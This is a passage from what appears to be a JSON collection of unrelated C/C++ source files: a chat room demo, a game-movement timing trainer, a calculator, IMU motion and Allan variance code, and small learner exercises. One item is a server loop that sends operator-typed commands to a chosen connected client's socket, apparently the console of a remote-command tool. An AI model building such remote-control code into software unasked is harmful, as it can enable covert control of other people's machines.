user_1.JoinChatRoom(chatRoom_1);\r\n    user_2.JoinChatRoom(chatRoom_2);\r\n    user_3.JoinChatRoom(chatRoom_1);\r\n    user_3.JoinChatRoom(chatRoom_2);\r\n\r\n    chatRoom_1.SendMessage(\"Hi, nice to meet you!\");\r\n    chatRoom_2.SendMessage(\"I'm Taeguk Kwon!\");\r\n}\r\n",
    "#include <windows.h>\n#include <stdlib.h>\n#include <stdio.h>\n#include <Xinput.h>\n\nunsigned int const FRAME_RATE = 240;\nint const KEYBOARD_CROUCH_KEY = 'C';\nint const GAMEPAD_CROUCH_KEY = XINPUT_GAMEPAD_LEFT_SHOULDER;\nint const KEYBOARD_JUMP_KEY = ' ';\nint const GAMEPAD_JUMP_KEY = XINPUT_GAMEPAD_RIGHT_SHOULDER;\n\n// src: https://github.com/muckelba/superglidetrainer/blob/main/src/routes/superglidetrainer/%2Bpage.svelte\nenum State {\n\tReady, // Initial State\n\tJump, // Partial Sequence\n\tJumpWarned, // Multi-Jump Warning Sent\n\tCrouch // Incorrect Sequence, let it play out for a bit\n};\n\nint main(int argc, char* argv[]) {\n\tLARGE_INTEGER frequency, time_start, time_now;\n\tDWORD dwResult;\n\tXINPUT_STATE xinput_state;\n\tState state = Ready, lastState = Jump;\n\tdouble elapsed_time = 0, elapsed_frame = 0, sg_chance = 0;\n\tbool crouch_pressed = false, jump_pressed = false, now_crouch_pressed = false, now_jump_pressed = false;\n\ttimeBeginPeriod(1);\n\tQueryPerformanceFrequency(&frequency);\n\tQueryPerformanceCounter(&time_start);\n\twhile (true) {\n\t\tfor (DWORD i = 0; i < XUSER_MAX_COUNT; i++){\n\t\t\tZeroMemory(&xinput_state, sizeof(XINPUT_STATE));\n\t\t\tdwResult = XInputGetState(i, &xinput_state);\n\t\t\tif (dwResult == ERROR_SUCCESS) {\n\t\t\t\tnow_crouch_pressed = xinput_state.Gamepad.wButtons & GAMEPAD_CROUCH_KEY;\n\t\t\t\tnow_jump_pressed = xinput_state.Gamepad.wButtons & GAMEPAD_JUMP_KEY;\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tnow_crouch_pressed = now_crouch_pressed || (GetKeyState(KEYBOARD_CROUCH_KEY) & 0x8000);\n\t\tnow_jump_pressed = now_jump_pressed || (GetKeyState(KEYBOARD_JUMP_KEY) & 0x8000);\n\t\tif (!crouch_pressed && now_crouch_pressed) {\n\t\t\tif (state == Ready) {\n\t\t\t\tQueryPerformanceCounter(&time_start);\n\t\t\t\tstate = Crouch;\n\t\t\t}\n\t\t\telse if (state == Jump || state == JumpWarned) {\n\t\t\t\tQueryPerformanceCounter(&time_now);\n\t\t\t\telapsed_time = (time_now.QuadPart - time_start.QuadPart) * 1000.0 / frequency.QuadPart;\n\t\t\t\telapsed_frame = elapsed_time / (1000 / FRAME_RATE);\n\t\t\t\tif (elapsed_frame < 1) {\n\t\t\t\t\tsg_chance = elapsed_frame;\n\t\t\t\t}\n\t\t\t\telse if (elapsed_frame < 2) {\n\t\t\t\t\tsg_chance = 2 - elapsed_frame;\n\t\t\t\t}\n\t\t\t\telse {\n\t\t\t\t\tsg_chance = 0;\n\t\t\t\t}\n\t\t\t\tprintf(\"%10.4fms, %10.4ff, %10.4f%%\\n\", elapsed_time, elapsed_frame, sg_chance * 100);\n\t\t\t\tstate = Ready;\n\t\t\t}\n\t\t\telse if (state == Crouch) {\n\t\t\t\tstate = Ready;\n\t\t\t}\n\t\t}\n\t\tif (!jump_pressed && now_jump_pressed) {\n\t\t\tif (state == Ready) {\n\t\t\t\tQueryPerformanceCounter(&time_start);\n\t\t\t\tstate = Jump;\n\t\t\t}\n\t\t\telse if (state == Jump || state == JumpWarned) {\n\t\t\t\tQueryPerformanceCounter(&time_start);\n\t\t\t\tstate = JumpWarned;\n\t\t\t}\n\t\t\telse if (state == Crouch) {\n\t\t\t\tQueryPerformanceCounter(&time_now);\n\t\t\t\telapsed_time = (time_now.QuadPart - time_start.QuadPart) * 1000.0 / frequency.QuadPart;\n\t\t\t\telapsed_frame = elapsed_time / (1000 / FRAME_RATE);\n\t\t\t\tsg_chance = 0;\n\t\t\t\tprintf(\"%10.4fms, %10.4ff, %10.4f%%\\n\", -elapsed_time, -elapsed_frame, sg_chance * 100);\n\t\t\t\tstate = Ready;\n\t\t\t}\n\t\t}\n\t\tcrouch_pressed = now_crouch_pressed;\n\t\tjump_pressed = now_jump_pressed;\n\t}\n\treturn EXIT_SUCCESS;\n}",
    "#include <iostream>\n#include <math.h>\n\nusing namespace std;\n\n//Vari\u00e1veis\ndouble num1, num2;\nchar symbol;\nchar continueProgram;\ndouble result;\n\n\n//Fun\u00e7\u00f5es dos operadores matem\u00e1ticos\ndouble add(double x, double y){\n  return x + y;\n}\n\ndouble sub(double x, double y){\n  return x - y;\n}\n\ndouble mult(double x, double y){\n  return x * y;\n}\n\ndouble div(double x, double y){\n  return x / y;\n}\n\ndouble powBase(double x, double y){\n  return pow(x, y);\n}\n\ndouble sqrtBase(double x, double y){\n  return pow(x, 1.0/y);//Uma alternativa para calcular a ra\u00edz de algum n\u00famero. Usando a pot\u00eancia com base x, elevo a 1 para o resultado ser ele mesmo, por\u00e9m divido esse expoente pela segunda entrada do usu\u00e1rio para definir a ra\u00edz. Se y for 2, ser\u00e1 ra\u00edz quadrada. Se y for 3, ser\u00e1 ra\u00edz c\u00fabica e assim por diante.\n}\n\n\n\n\nint main() {\n  #define output cout << \"Result:\\n\" << result << endl;\n\n  \n  cout << \"Please enter the operation to perform. Format: a+b | a-b | a*b | a/b | a^b | avb\\n\";\n  cin >> num1 >> symbol >> num2;\n\n  if(symbol == '+'){\n    result = add(num1, num2);\n    output;\n  } else if (symbol == '-'){\n    result = sub(num1, num2);\n    output;\n  } else if (symbol == '*'){\n    result = mult(num1, num2);\n    output;\n  } else if (symbol == '/'){\n    result = div(num1, num2);\n    output;\n  } else if (symbol == '^'){\n    result = powBase(num1, num2);\n    output;\n  } else if (symbol == 'v' || symbol == 'V'){\n    result = sqrtBase(num1, num2);\n    output;\n  } else {\n    cout << \"Invalid operator\" << endl;\n  }\n\n  cout << \"Would you like to continue on the calculator? [y(yes)/n(no)]\" << endl;\n  cin >> continueProgram;\n\n  /*Operador tern\u00e1rio. S\u00e3o como if/else simples, mas em uma linha s\u00f3.\n  Primeiro colocamos a condi\u00e7\u00e3o entre par\u00eanteses, depois a interroga\u00e7\u00e3o indica a pergunta dentro do par\u00eanteses. \n  Caso a condi\u00e7\u00e3o seja verdadeira, ir\u00e1 executar o que foi escrito ap\u00f3s a interroga\u00e7\u00e3o.\n  Caso falso, ir\u00e1 executar o que foi escrito ap\u00f3s os dois pontos \":\". Os dois pontos e o conte\u00fado ap\u00f3s ele s\u00e3o obrigat\u00f3rios no operador tern\u00e1rio.\n  */\n  (continueProgram == 'y' || continueProgram == 'Y' || continueProgram == ' ') ? cout << \"Thank you for using the calculator!\" << endl << main() : cout << \"Good bye! :D\";\n\n  return 0;\n}\n",
    "//\n// Created by hyj on 18-1-19.\n//\n#include <iomanip>\n#include \"utilities.h\"\n/** 6\u81ea\u7531\u5ea6\u8fd0\u52a8 **/\n//void motion_model(Eigen::Vector3d& position, Eigen::Matrix3d& Rwb, Eigen::Vector3d& velocity, Eigen::Vector3d& acc, Eigen::Vector3d& gyro, double t)\n//{\n//\n//    MotionData data;\n//    // param\n//    float ellipse_x = 15;\n//    float ellipse_y = 20;\n//    float z = 1;           // z\u8f74\u505asin\u8fd0\u52a8\n//    float K1 = 10;          // z\u8f74\u7684\u6b63\u5f26\u9891\u7387\u662fx\uff0cy\u7684k1\u500d\n//    float K = M_PI/ 10;    // 20 * K = 2pi \u3000\u3000\u7531\u4e8e\u6211\u4eec\u91c7\u53d6\u7684\u662f\u65f6\u95f4\u662f20s, \u7cfb\u6570K\u63a7\u5236yaw\u6b63\u597d\u65cb\u8f6c\u4e00\u5708\uff0c\u8fd0\u52a8\u4e00\u5468\n//\n//    // translation\n//    // twb:  body frame in world frame\n//    position = Eigen::Vector3d( ellipse_x * cos( K * t) + 5, ellipse_y * sin( K * t) + 5,  z * sin( K1 * K * t ) + 5);\n//    velocity = Eigen::Vector3d(- K * ellipse_x * sin(K*t),  K * ellipse_y * cos(K*t), z*K1*K * cos(K1 * K * t));              // position\u5bfc\u6570\u3000in world frame\n//    double K2 = K*K;\n//    acc = Eigen::Vector3d( -K2 * ellipse_x * cos(K*t),  -K2 * ellipse_y * sin(K*t), -z*K1*K1*K2 * sin(K1 * K * t));     // position\u4e8c\u9636\u5bfc\u6570\n//\n//    // Rotation\n//    double k_roll = 0.1;\n//    double k_pitch = 0.2;\n//    Eigen::Vector3d eulerAngles(k_roll * cos(t) , k_pitch * sin(t) , K*t );   // roll ~ [-0.2, 0.2], pitch ~ [-0.3, 0.3], yaw ~ [0,2pi]\n//    Eigen::Vector3d eulerAnglesRates(-k_roll * sin(t) , k_pitch * cos(t) , K);      // euler angles \u7684\u5bfc\u6570\n//\n////    Eigen::Vector3d eulerAngles(0.0,0.0, K*t );   // roll ~ 0, pitch ~ 0, yaw ~ [0,2pi]\n////    Eigen::Vector3d eulerAnglesRates(0.,0. , K);      // euler angles \u7684\u5bfc\u6570\n//\n//    Rwb = euler2Rotation(eulerAngles);         // body frame to world frame\n//    gyro = eulerRates2bodyRates(eulerAngles) * eulerAnglesRates;   //  euler rates trans to body gyro\n//\n//}\n/** \u5e73\u9762\u8fd0\u52a8 **/\nvoid motion_model(Eigen::Vector3d& position, Eigen::Matrix3d& Rwo, Eigen::Vector3d& velocity, Eigen::Vector3d& acc, Eigen::Vector3d& gyro,  Eigen::Vector3d& dgyro, double t){\n    // param\n    float ellipse_x = 15;\n    float ellipse_y = 20;\n    float z = 1;           // \u6cbf\u692d\u5706\u5706\u5fc3\u7684sin\u8fd0\u52a8\u632f\u8361\n    float K1 = 10;          // z\u8f74\u7684\u6b63\u5f26\u9891\u7387\u662fx\uff0cy\u7684k1\u500d\n    float K = M_PI/ 10;    // 20 * K = 2pi \u3000\u3000\u7531\u4e8e\u6211\u4eec\u91c7\u53d6\u7684\u662f\u65f6\u95f4\u662f20s, \u7cfb\u6570K\u63a7\u5236yaw\u6b63\u597d\u65cb\u8f6c\u4e00\u5708\uff0c\u8fd0\u52a8\u4e00\u5468\n\n    // translation\n    // twb:  body frame in world frame\n    double ox = 5;\n    double oy = 5;\n    double x0 = ellipse_x * cos( K * t);\n    double x1 = x0 + ox;\n    double y0 = ellipse_y * sin( K * t);\n    double y1 = y0 + oy;\n//    double z0 = z * sin( K1 * K * t ) + 5;\n    double z0 = 5;\n    double offset = z * sin( K1 * K * t );\n    double doff = z*K1*K * cos(K1 * K * t);\n    double l_2 = x0*x0 + y0*y0;\n    double l = sqrt(l_2);\n    double l_3_2 = l_2 * l;\n    position = Eigen::Vector3d( x1 + x0/l*offset, y1+y0/l*offset, z0 );\n\n    double dx0 = - K * ellipse_x * sin(K*t);\n    double K2 = K*K;\n    double ddx0 = -K2 * ellipse_x * cos(K*t);\n    double dy0 = K * ellipse_y * cos(K*t);\n    double ddy0 = -K2 * ellipse_y * sin(K*t);\n    double dz0 = 0;\n    double dl = 1/l*(x0*dx0+y0*dy0);\n    velocity = Eigen::Vector3d (dx0*(1+offset/l)+x0*z*K1*K*cos(K1*K*t)/l-x0*offset*(x0*dx0+y0*dy0)/l_3_2,  dy0*(1+offset/l)+y0*z*K1*K*cos(K1*K*t)/l-y0*offset*(x0*dx0+y0*dy0)/l_3_2, 0);              // position\u5bfc\u6570\u3000in world frame\n\n    acc = Eigen::Vector3d(ddx0*(1+offset/l)+(dx0*doff*l-2*dx0*offset*dl-2*x0*doff*dl-x0*K1*K1*K2*offset*l)/l_2+z*dx0*K1*K*cos(K1*K*t)/l-3*x0*offset*(x0*dx0+y0*dy0)*dl/pow(l_2,3)-x0*offset*(dx0*dx0+x0*ddx0+dy0*dy0+y0*ddy0)/l_3_2\n            ,ddy0*(1+offset/l)+(dy0*doff*l-2*dy0*offset*dl-2*y0*doff*dl-y0*K1*K1*K2*offset*l)/l_2+z*dy0*K1*K*cos(K1*K*t)/l-3*y0*offset*(x0*dx0+y0*dy0)*dl/pow(l_2,3)-y0*offset*(dx0*dx0+x0*ddx0+dy0*dy0+y0*ddy0)/l_3_2\n            ,0);\n\n    // \u5145\u5206\u65cb\u8f6c\n//    Eigen::Vector3d eulerAngles(0.0,0.0, K*t +  0.79 * sin(K1 * K * t));   // roll ~ 0, pitch ~ 0, yaw ~ [0,2pi]\n//    Eigen::Vector3d eulerAnglesRates(0.,0. , K + 0.79 * K1 * K* cos(K1 * K * t));      // euler angles \u7684\u5bfc\u6570\n//    dgyro = Eigen::Vector3d (0.,0. , -0.79 * K1 * K * K1 * K * sin(K1 * K * t));      // euler angles \u7684\u5bfc\u6570\n\n    // \u666e\u901a\u65cb\u8f6c\n    Eigen::Vector3d eulerAngles(0.0,0.0, K*t);   // roll ~ 0, pitch ~ 0, yaw ~ [0,2pi]\n    Eigen::Vector3d eulerAnglesRates(0.,0. , K );      // euler angles \u7684\u5bfc\u6570\n    dgyro = Eigen::Vector3d (0.,0. , 0);      // euler angles \u7684\u5bfc\u6570\n\n    Rwo = euler2Rotation(eulerAngles);         // body frame to world frame\n    gyro = eulerAnglesRates;   //  euler rates trans to body gyro\n\n}\nEigen::Matrix3d skewSymmetric(const Eigen::Vector3d &q)\n{\n    Eigen::Matrix3d ans;\n    ans << 0.0, -q(2), q(1),\n            q(2), 0.0, -q(0),\n            -q(1), q(0), 0.0;\n    return ans;\n}\nvoid save_points(std::string filename, std::vector<Eigen::Vector4d, Eigen::aligned_allocator<Eigen::Vector4d> > points)\n{\n    std::ofstream save_points;\n    save_points.open(filename.c_str());\n\n    for (int i = 0; i < points.size(); ++i) {\n        Eigen::Vector4d p = points[i];\n\n        save_points<<p(0)<<\" \"\n                   <<p(1)<<\" \"\n                   <<p(2)<<\" \"\n                   <<p(3)<<std::endl;\n    }\n}\nvoid save_features(std::string filename,\n ",
    "#include \"ServerQueries.h\"\n#include <windows.h>\n#include <iostream>\n#include <string>\n#include <vector>\n#include \"clientManager.h\"\n\n\nstd::string first_numberstring(std::string const& str)\n{\n\tchar const* digits = \"0123456789\";\n\tstd::size_t const n = str.find_first_of(digits);\n\tif (n != std::string::npos)\n\t{\n\t\tstd::size_t const m = str.find_first_not_of(digits, n);\n\t\treturn str.substr(n, m != std::string::npos ? m - n : m);\n\t}\n\treturn std::string();\n}\n\nvoid ServerQueries_t(std::shared_ptr<ClientsManager> clientManager_ptr) {\n\n\tstd::string input_cmd{ \"\" };\n\tstd::string cmd_b64_str;\n\tstd::string transfer_data;\n\n\twhile (TRUE) {\n\n\t\tstd::getline(std::cin, input_cmd);\n\n\t\t// Check input command for switching client \n\t\tif (input_cmd.compare(0, 13, \"select client\") == 0){\n\t\t\tstd::string tmp_str = first_numberstring(input_cmd);\n\t\t\tif (!tmp_str.empty()) {\t\t\t\t\t\t\t\t\t// Check if the user doesn't enter Number\n\t\t\t\tclientManager_ptr->setActiveClient(stoi(tmp_str));\t// If the string contains number, convert to string. Otherwise; don't eval this statement (to avoid exception)\t\t\t\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t}\n\t\tif (clientManager_ptr->getActiveClientSocket() == INVALID_SOCKET) {\n\t\t\tclientManager_ptr->printValidClients();\n\t\t\tcontinue;\n\t\t}\n\t\tinput_cmd.append(\"\\n\");\n\n\t\t//\tSend the packet through socket\n\t\tsend(clientManager_ptr->getActiveClientSocket(), input_cmd.c_str(), input_cmd.size(), 0);\n\t\ttransfer_data.clear();\n\n\t\t//\tIf the send command was \"exit\", then release the socket\n\t\tif (!(input_cmd.compare(0, std::string(\"exit\").length(), std::string(\"exit\")))) {\n\t\t\tclosesocket(clientManager_ptr->getActiveClientSocket());\n\t\t}\n\t}\n}",
    "#include <iostream>\r\n#include <stdlib.h>\r\n#include<time.h>\r\nusing namespace std;\r\nint main() {\r\n\r\n     cout<<\"\\n\\t\\t\\tWelcome to Digit Detective-A number Guessing Game!\"<<endl;\r\n     cout<<\"--------------------------------------------------------------------------------------------------------------------------------\"<<endl;\r\n     cout<<\"You have to guess a number according to level. You will have limited chances to guess according to the Level you choose.Good Luck!\"<<endl;\r\n    \r\n    srand(time(0));\r\n    int a;\r\n    int p;\r\n     cout<< \"\\nEnter the difficulty level  \\n\";\r\n        cout<< \"1 for easy!\\t\";\r\n        cout<<\"2 for normal!\\t\";\r\n        cout<<\"3 for difficult!\\t\";\r\n        cout<<\"0 for ending the game!\\n\"<<endl;\r\n    cin>>p;\r\n    while(p==1 || p==2 || p==3){\r\n        if(p==1){\r\n            a=rand()%10+1;\r\n            cout<<\"You are playing easy mode, numbers range from 1 to 10 \"<<endl;\r\n            cout<<endl;\r\n        }\r\n        else if(p==2){\r\n            a=rand()%100+1;\r\n            cout<<\"You are playing normal mode, numbers range from 1 to 100\"<<endl;\r\n            cout<<endl;\r\n        }\r\n        else{\r\n            a=rand()%1000+1;\r\n            cout<<\"You are playing hard mode, numbers range from 1 to 1000\"<<endl;\r\n            cout<<endl;\r\n        }\r\n        \r\n        int n;\r\n        cout<<\"Choose a Number \";\r\n        cin>>n;\r\n    \r\n        while(n!=a){\r\n            if(n<a){\r\n                cout<<\"\\nYour guess is Low.\"<<endl;\r\n            }\r\n            else{\r\n                cout<<\"\\nYour guess is High.\"<<endl;\r\n            }\r\n            cout<<\"\\nChoose Again \";\r\n            cin>>n;\r\n        }\r\n        cout<<\"\\nYou got it!, number is : \"<<a<<endl;\r\n        cout<<endl;\r\n        \r\n        cout<<\"Enter 1 for easy mode,2 for normal mode and 3 for hard mode and any other key to Quit\"<<endl;\r\n        cin>>p;\r\n    }\r\n    \r\n    return 0;\r\n}",
    "#include \"fitallan_gyr.h\"\n\nusing namespace imu;\n\nFitAllanGyr::FitAllanGyr( std::vector< double > sigma2s, std::vector< double > taus, double _freq )\n: Q( 0.0 )\n, N( 0.0 )\n, B( 0.0 )\n, K( 0.0 )\n, R( 0.0 )\n, freq( _freq )\n{\n    if ( sigma2s.size( ) != taus.size( ) )\n        std::cerr << \"Error of point size\" << std::endl;\n\n    m_taus = taus;\n\n    std::vector< double > init = initValue( sigma2s, taus );\n\n    int num_samples = sigma2s.size( );\n    //    double param[]  = { Q, N, B, K, R };\n    double param[] = { init[0], init[1], init[2], init[3], init[4] };\n\n    ceres::Problem problem;\n\n    for ( int i = 0; i < num_samples; ++i )\n    {\n        // std::cout << \"sigma \" << i << \" \" << taus[i] << \" \" << sigma2s[i] << std::endl;\n\n        ceres::CostFunction* f = new ceres::AutoDiffCostFunction< AllanSigmaError, 1, 5 >(\n        new AllanSigmaError( sigma2s[i], taus[i] ) );\n\n        problem.AddResidualBlock( f, NULL /* squared loss */, param );\n    }\n    ceres::Solver::Options options;\n    options.minimizer_progress_to_stdout = true;\n    options.logging_type                 = ceres::SILENT;\n    options.trust_region_strategy_type   = ceres::DOGLEG;\n    //    options.max_num_iterations         = 5;\n\n    ceres::Solver::Summary summary;\n    ceres::Solve( options, &problem, &summary );\n    //        std::cout << summary.FullReport( ) << \"\\n\";\n    //    std::cout << \"num_parameters \" << summary.num_parameters << std::endl;\n\n    Q = param[0];\n    N = param[1];\n    B = param[2];\n    K = param[3];\n    R = param[4];\n\n    // std::cout << \"Q \" << Q //\n    //           << \" \" << N  //\n    //           << \" \" << B  //\n    //           << \" \" << K  //\n    //           << \" \" << R << std::endl;\n\n    std::cout << \" Bias Instability \" << getB( ) / ( 57.3 * 3600 ) << \" rad/s\" << std::endl;\n    std::cout << \" Bias Instability \" << getBiasInstability( ) << \" rad/s, at \"\n              << taus[findMinIndex( calcSimDeviation( taus ) )] << \" s\" << std::endl;\n\n    std::cout << \" White Noise \" << sqrt( freq ) * getN( ) * 60 / 57.3 << \" rad/s\" << std::endl;\n    std::cout << \" White Noise \" << getWhiteNoise( ) << \" rad/s\" << std::endl;\n}\n\nstd::vector< double >\nFitAllanGyr::initValue( std::vector< double > sigma2s, std::vector< double > taus )\n{\n    if ( sigma2s.size( ) != taus.size( ) )\n        std::cout << \" Error with data size!!!\" << std::endl;\n\n    Eigen::MatrixXd Y( sigma2s.size( ), 1 );\n\n    for ( unsigned int index = 0; index < sigma2s.size( ); ++index )\n    {\n        Y( index, 0 ) = sqrt( sigma2s[index] );\n    }\n    //        std::cout << \"Y \" << Y << std::endl;\n\n    int m_order = 2;\n\n    Eigen::MatrixXd B( 2 * m_order + 1, 1 );\n    B.setZero( );\n\n    Eigen::MatrixXd F( taus.size( ), 2 * m_order + 1 );\n    F.setZero( );\n\n    for ( unsigned int index = 0; index < taus.size( ); ++index )\n        for ( int order_index = 0; order_index < 2 * m_order + 1; ++order_index )\n        {\n            int kk                  = order_index - m_order;\n            F( index, order_index ) = pow( sqrt( taus[index] ), kk );\n        }\n    //        std::cout << \"F \" << F << std::endl;\n\n    Eigen::MatrixXd A = F.transpose( ) * F;\n    B                 = F.transpose( ) * Y;\n    //        std::cout << \"B \" << B << std::endl;\n    //        std::cout << \"A \" << A << std::endl;\n\n    Eigen::MatrixXd C = A.inverse( ) * B;\n    std::cout << \"C \" << C.transpose( ) << std::endl;\n\n    std::vector< double > init;\n    for ( int index = 0; index < 2 * m_order + 1; ++index )\n        init.push_back( std::abs( C( index, 0 ) ) );\n\n    return init;\n}\n\nstd::vector< double >\nFitAllanGyr::calcSimDeviation( const std::vector< double > taus ) const\n{\n    std::vector< double > des;\n    for ( auto& tau : taus )\n        des.push_back( sqrt( calcSigma2( Q, N, B, K, R, tau ) ) );\n    return des;\n}\n\ndouble\nFitAllanGyr::getBiasInstability( ) const\n{\n    return findMinNum( calcSimDeviation( m_taus ) ) / ( 57.3 * 3600 );\n}\n\ndouble\nFitAllanGyr::getWhiteNoise( ) const\n{\n    return sqrt( freq ) * sqrt( calcSigma2( Q, N, B, K, R, 1 ) ) / ( 57.3 * 3600 );\n}\n\ndouble\nFitAllanGyr::findMinNum( const std::vector< double > num ) const\n{\n    double min = 1000.0;\n    for ( unsigned int index = 0; index < num.size( ); ++index )\n        min = min < num[index] ? min : num[index];\n    return min;\n}\n\nint\nFitAllanGyr::findMinIndex( std::vector< double > num )\n{\n    double min    = 1000.0;\n    int min_index = 0;\n    for ( unsigned int index = 0; index < num.size( ); ++index )\n    {\n        min_index = min < num[index] ? min_index : index;\n        min       = min < num[index] ? min : num[index];\n    }\n    return min_index;\n}\n\ndouble\nFitAllanGyr::calcSigma2( double _Q, double _N, double _B, double _K, double _R, double _tau ) const\n{\n    // clang-format off\n  return  _Q * _Q / ( _tau * _tau )\n      + _N * _N / _tau\n      + _B * _B\n      + _K * _K * _tau\n      + _R * _R * _tau * _tau;\n    // clang-format on\n}\n\ndouble\nFitAllanGyr::getN( ) const\n{\n    return sqrt( N * N ) / 60.0;\n}\n\ndouble\nFitAllanGyr::getB( ) const",
    "/*\n *  lab2exe_A.cpp\n *  ENSF 694 Lab 2 Exercise A\n */\n\nint my_strlen(const char *s);\n/*  Duplicates strlen from <cstring>, except return type is int.\n *  REQUIRES\n *     s points to the beginning of a string.\n *  PROMISES\n *     Returns the number of chars in the string, not including the\n *     terminating null.\n */\n\nvoid my_strncat(char *dest, const char *source, int);\n/*  Duplicates strncat from <cstring>, except return type is void.\n */\n\n#include <iostream>\n#include <cstring>\nusing namespace std;\n\nint main(void)\n{\n    char str1[7] = \"banana\";\n    const char str2[] = \"-tacit\";\n    const char* str3 = \"-toe\";\n    \n    /* point 1 */\n    char str5[] = \"ticket\";\n    char my_string[100]=\"\";\n    int bytes;\n    int length;\n    \n    /* using strlen libarary function */\n    length = (int) strlen(my_string);\n    cout << \"\\nLine 1: my_string length is \" << length;\n  \n    /* using sizeof operator */\n    bytes = sizeof (my_string);\n    cout << \"\\nLine 2: my_string size is \" << bytes << \" bytes.\";\n   \n    /* using strcpy libarary function */\n    strcpy(my_string, str1);\n    cout << \"\\nLine 3: my_string contains: \" << my_string;\n   \n    length = (int) strlen(my_string);\n    cout << \"\\nLine 4: my_string length is \" << length << \".\";\n   \n    my_string[0] = '\\0';\n    cout << \"\\nLine 5: my_string contains:\\\"\" << my_string << \"\\\"\";\n  \n    length = (int) strlen(my_string);\n    cout << \"\\nLine 6: my_string length is \" <<  length << \".\";\n   \n    bytes = sizeof (my_string);\n    cout << \"\\nLine 7: my_string size is still \" << bytes << \" bytes.\";\n \n    /* strncat append the first 3 characters of str5 to the end of my_string */\n    strncat(my_string, str5, 3);\n    cout << \"\\nLine 8: my_string contains:\\\"\" << my_string << \"\\\"\";\n  \n    length = (int) strlen(my_string);\n    cout << \"\\nLine 9: my_string length is \" << length << \".\";\n   \n    strncat(my_string, str2,  4);\n    cout << \"\\nLine 10: my_string contains:\\\"\" << my_string << \"\\\"\";\n    \n    /* strncat append ONLY up ot '\\0' character from str3 -- not 6 characters */\n    strncat(my_string, str3, 6);\n    cout << \"\\nLine 11: my_string contains:\\\"\" << my_string << \"\\\"\";\n   \n    length = (int) strlen(my_string);\n    cout << \"\\nLine 12; my_string has \" << length << \" characters.\";\n\n    cout << \"\\n\\nUsing strcmp - C library function: \";\n    \n    cout << \"\\n\\\"ABCD\\\" is less than \\\"ABCDE\\\" ... strcmp returns: \" <<\n    strcmp(\"ABCD\", \"ABCDE\");\n\n    cout << \"\\n\\\"ABCD\\\" is less than \\\"ABND\\\" ... strcmp returns: \" <<\n    strcmp(\"ABCD\", \"ABND\");\n    \n    cout << \"\\n\\\"ABCD\\\" is equal than \\\"ABCD\\\" ... strcmp returns: \" <<\n    strcmp(\"ABCD\", \"ABCD\");\n \n    cout << \"\\n\\\"ABCD\\\" is less than \\\"ABCd\\\" ... strcmp returns: \" <<\n    strcmp(\"ABCD\", \"ABCd\");\n\n    cout << \"\\n\\\"Orange\\\" is greater than \\\"Apple\\\" ... strcmp returns: \" <<\n    strcmp(\"Orange\", \"Apple\") << endl;\n    return 0;\n}\n",
    "#include <alloca.h>\n#include <cmath>\n#include <iostream>\nint main(int argc, char *argv[]) {\n  int g = 90;\n  std::cout << \"Hwllo Qoeld\" << std::endl;\n  std::cout << \"          /|\" << std::endl;\n  std::cout << \"         / |\" << std::endl;\n  std::cout << \"        /  |\" << std::endl;\n  std::cout << \"       /   |\" << std::endl;\n  std::cout << \"      /____|\" << std::endl;\n  std::cout << g << std::endl;\n\n  g = 10;\n  std::cout << \"G =\" << g << std::endl;\n  std::string hp = \"Hhshs\";\n  int h = 20;\n  char pp = 'Z';\n  double fg = 3.1462728291029291209110;\n  bool isGay = false;\n\n  /*  std::cout << hp << std::endl;\n  // std::cout << h << std::endl;\n  //  std::cout << pp << std::endl;\n  // std::cout << fg << std::endl;*/\n  std::cout << isGay << std::endl;\n  std::cout << hp.length() << std::endl;\n  std::cout << hp[0] << std::endl;\n  hp[1] = 'B';\n  std::cout << hp << std::endl;\n  hp = \"Termux alacritty\";\n  std::cout << hp.find(\"alacritty\", 0) << std::endl;\n  std::cout << hp.substr(0, 6) << std::endl;\n  std::cout << 40 % 20;\n  h++;\n  std::cout << h << std::endl;\n  std::cout << pow(2, 2) << std::endl;\n  std::cout << sqrt(36) << std::endl;\n  std::cout << round(4.3) << std::endl;\n  std::cout << round(4.7) << std::endl;\n  std::cout << ceil(4.1) << std::endl;\n  std::cout << floor(4.9) << std::endl;\n  std::cout << fmax(3, 7) << std::endl;\n  std::cout << fmin(6, 10) << std::endl;\n  return 0;\n}\n"
]